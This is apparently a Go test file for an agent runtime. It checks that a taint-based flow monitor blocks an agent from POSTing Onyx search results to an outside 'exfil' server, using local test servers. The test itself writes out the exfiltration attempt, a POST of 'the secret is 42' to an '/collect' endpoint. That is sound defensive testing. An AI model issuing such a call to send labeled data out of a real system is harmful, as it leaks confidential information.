package dist

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"sync/atomic"
	"testing"

	"github.com/aurora-capcompute/aurora-dispatchers/builtin"
	"github.com/aurora-capcompute/aurora-dispatchers/registry"
	"github.com/aurora-capcompute/capcompute"
	"github.com/aurora-capcompute/capcompute/sys"
)

// flowCred is a minimal process identity for the flow monitor.
type flowCred struct{ pid string }

func (c flowCred) PID() string { return c.pid }

// After the agent reads Onyx, it must not be able to post that content out.
// This exercises the whole kernel flow path end to end over the real drivers:
// the labeled core.httpTemplate search taints the run automatically (no manual
// WithTaint), and a subsequent core.internet POST that forbids the label is
// denied by the reference monitor before the request ever leaves — the model
// cannot launder the content out because the taint is on the run, not the bytes.
func TestFlowBlocksOnyxToInternetExfil(t *testing.T) {
	var onyxHits, exfilHits atomic.Int64
	onyx := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		onyxHits.Add(1)
		_, _ = w.Write([]byte(`{"answer":"the secret is 42"}`))
	}))
	defer onyx.Close()
	exfil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		exfilHits.Add(1)
		_, _ = w.Write([]byte(`ok`))
	}))
	defer exfil.Close()

	// Build the real drivers from a manifest: an Onyx search labeled "onyx_data",
	// and an internet POST that forbids "onyx_data". Loopback http is used only so
	// the test can observe (or not observe) the request reaching the wire.
	var config builtin.Config
	searchCfg := fmt.Sprintf(`{"allow_private_network":true,"operations":[`+
		`{"name":"search_onyx","method":"POST","base_url":%q,"path":"/api/search",`+
		`"body":{"query":"{{query}}"},"params":{"query":{"type":"string","required":true}},`+
		`"labels":["onyx_data"]}]}`, onyx.URL)
	if err := (registry.HTTPTemplateRegistration{}).Configure(context.Background(), json.RawMessage(searchCfg), registry.Services{}, &config); err != nil {
		t.Fatalf("configure template: %v", err)
	}
	netCfg := fmt.Sprintf(`{"allow_private_network":true,"capabilities":[`+
		`{"methods":["POST"],"domain":%q,"taints":["onyx_data"]}]}`, exfil.URL)
	if err := (registry.InternetRegistration{}).Configure(context.Background(), json.RawMessage(netCfg), registry.Services{}, &config); err != nil {
		t.Fatalf("configure internet: %v", err)
	}

	// The canonical flow chain over the drivers: FlowMonitor → Labeler → drivers.
	// The monitor accumulates every observed label into the run's taint and
	// refuses a syscall whose forbidden set intersects it.
	taints := capcompute.NewTaints[string]()
	chain := capcompute.NewFlowMonitor[string, flowCred](taints, capcompute.NewLabeler[flowCred](builtin.New[flowCred](config)))

	dispatch := func(cred flowCred, name string, args map[string]any) sys.SyscallResult {
		raw, _ := json.Marshal(args)
		result, err := chain.Dispatch(context.Background(), cred, sys.Syscall{Abi: sys.ABIVersion, Name: name, Args: raw}, sys.Authorization{})
		if err != nil {
			t.Fatalf("dispatch %s: %v", name, err)
		}
		return result
	}

	// Baseline: on a clean run (no Onyx read), the POST is allowed — so a later
	// denial is proven to come from the taint, not from a blanket block.
	clean := dispatch(flowCred{"clean"}, "core.internet",
		map[string]any{"method": "POST", "url": exfil.URL + "/collect", "body": "hello"})
	if clean.Status() != sys.StatusResult {
		t.Fatalf("clean POST = %#v, want allowed", clean)
	}
	if exfilHits.Load() != 1 {
		t.Fatalf("exfil hits = %d after the clean POST, want 1", exfilHits.Load())
	}

	// The run reads Onyx: the result is labeled and the monitor taints the run.
	agent := flowCred{"agent"}
	search := dispatch(agent, "core.httpTemplate",
		map[string]any{"operation": "search_onyx", "query": "what is the secret"})
	if search.Status() != sys.StatusResult {
		t.Fatalf("search = %#v, want a successful result", search)
	}
	if onyxHits.Load() != 1 {
		t.Fatalf("onyx hits = %d, want 1", onyxHits.Load())
	}

	// Now the exfil attempt — even paraphrased, even in a later turn — is denied
	// before it leaves, and the exfil server is never touched.
	post := dispatch(agent, "core.internet",
		map[string]any{"method": "POST", "url": exfil.URL + "/collect", "body": "the secret is 42"})
	if post.Status() != sys.StatusFailed || post.Errno() != sys.ErrnoDenied {
		t.Fatalf("post after Onyx read = %v/%v, want failed/denied", post.Status(), post.Errno())
	}
	if exfilHits.Load() != 1 {
		t.Fatalf("SECURITY: exfil hits = %d — Onyx-derived data reached the network", exfilHits.Load())
	}
}
